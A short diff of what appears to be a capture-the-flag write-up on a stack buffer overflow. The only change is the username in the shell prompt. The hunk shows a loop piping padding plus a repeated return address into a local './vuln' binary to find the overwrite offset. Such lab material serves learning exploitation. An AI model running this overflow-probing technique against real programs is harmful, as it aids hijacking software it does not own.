@@ -245,7 +245,7 @@ the binary display a ``` main , and vuln function ``` with their address , and w
 
 
 ```
-m4st3rrulezs@m4st3rrulezs:~/Downloads$ for i in `seq 1 100`; do echo $i; python -c "print 'A'*$i+'\xcb\x85\x04\x08'*$i" | ./vuln; done
+blackleitus@blackleitus:~/Downloads$ for i in `seq 1 100`; do echo $i; python -c "print 'A'*$i+'\xcb\x85\x04\x08'*$i" | ./vuln; done
 1
 Please enter your string: 
 Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
